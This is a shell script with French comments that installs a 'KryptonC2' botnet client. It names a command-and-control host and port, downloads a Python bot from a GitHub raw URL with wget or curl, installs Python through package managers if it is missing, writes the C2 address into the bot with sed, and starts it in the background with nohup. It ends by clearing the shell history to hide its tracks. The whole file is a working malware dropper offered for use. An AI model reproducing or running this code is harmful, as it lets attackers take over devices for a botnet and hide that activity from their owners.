#!/bin/sh
# Script d'installation du bot KryptonC2
# À héberger sur un serveur web accessible

# Configuration du serveur C2
C2_ADDRESS="nlzpsjlvr.localto.net"
C2_PORT="7274"

# Télécharger le bot
cd /tmp || cd /var/tmp || cd / || cd /root || cd /home || cd /mnt || cd /opt || cd /usr || cd /bin || cd /sbin || cd /dev || cd /sys || cd /proc || cd /run || cd /var || cd /srv || cd /boot || cd /lib || cd /lib64 || cd /etc || cd /root

# Télécharger le bot Python (version minimale d'abord)
wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot_minimal.py -O bot.py 2>/dev/null || \
curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot_minimal.py -o bot.py 2>/dev/null || \
wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -O bot.py 2>/dev/null || \
curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -o bot.py 2>/dev/null

# Si Python n'est pas disponible, essayer d'installer ou utiliser busybox python
PYTHON_CMD=""
if command -v python3 >/dev/null 2>&1; then
    PYTHON_CMD="python3"
elif command -v python >/dev/null 2>&1; then
    PYTHON_CMD="python"
elif command -v python2 >/dev/null 2>&1; then
    PYTHON_CMD="python2"
elif command -v busybox >/dev/null 2>&1 && busybox python --version >/dev/null 2>&1; then
    PYTHON_CMD="busybox python"
else
    # Essayer d'installer Python (selon la distribution)
    echo "Python non trouve, tentative d'installation..."
    opkg update && opkg install python3 2>/dev/null || \
    apt-get update && apt-get install -y python3 2>/dev/null || \
    yum install -y python3 2>/dev/null || \
    apk add python3 2>/dev/null || \
    true
    
    # Vérifier à nouveau après installation
    if command -v python3 >/dev/null 2>&1; then
        PYTHON_CMD="python3"
    elif command -v python >/dev/null 2>&1; then
        PYTHON_CMD="python"
    fi
fi

# Si Python n'est toujours pas disponible, essayer de télécharger un binaire Python portable
if [ -z "$PYTHON_CMD" ]; then
    echo "Python non disponible, tentative de telechargement d'un binaire portable..."
    # Certains systèmes peuvent avoir des binaires Python dans /usr/bin ou ailleurs
    for py_path in /usr/bin/python* /bin/python* /usr/local/bin/python*; do
        if [ -x "$py_path" ] 2>/dev/null; then
            PYTHON_CMD="$py_path"
            break
        fi
    done
fi

# Modifier l'adresse du serveur C2 dans le bot
sed -i "s/KRYPTONC2_ADDRESS.*=.*\".*\"/KRYPTONC2_ADDRESS  = \"$C2_ADDRESS\"/" bot.py 2>/dev/null || \
sed -i "s/KRYPTONC2_ADDRESS.*=.*'.*'/KRYPTONC2_ADDRESS  = \"$C2_ADDRESS\"/" bot.py 2>/dev/null

sed -i "s/KRYPTONC2_PORT.*=.*[0-9]*/KRYPTONC2_PORT  = $C2_PORT/" bot.py 2>/dev/null

# Vérifier si Python est disponible avant de continuer
if [ -z "$PYTHON_CMD" ]; then
    echo "ERREUR: Python n'est pas disponible sur cet appareil"
    echo "Le bot ne peut pas etre execute sans Python"
    exit 1
fi

# Vérifier que le bot a été téléchargé
if [ ! -f bot.py ]; then
    echo "ERREUR: bot.py n'a pas pu etre telecharge"
    exit 1
fi

# Rendre exécutable
chmod +x bot.py

# Installer les dépendances de base (si possible) - seulement les modules standards
# bot_minimal.py n'utilise que des modules standards, donc pas besoin d'installer quoi que ce soit
# Mais on essaie quand même pour bot.py complet
$PYTHON_CMD -c "import socket, threading, time, random, struct, os, sys" 2>/dev/null || {
    echo "ERREUR: Modules Python standards manquants"
    exit 1
}

# Lancer le bot en arrière-plan avec gestion d'erreur
nohup $PYTHON_CMD bot.py > /tmp/bot.log 2>&1 &
BOT_PID=$!

# Attendre un peu et vérifier si le bot tourne
sleep 2
if ps -p $BOT_PID > /dev/null 2>&1 || kill -0 $BOT_PID 2>/dev/null; then
    echo "Bot lance avec succes (PID: $BOT_PID)"
else
    echo "ERREUR: Le bot ne s'est pas lance correctement"
    cat /tmp/bot.log 2>/dev/null || true
    exit 1
fi

# Nettoyer (mais garder bot.py pour debug)
# rm -f install_bot.sh
history -c

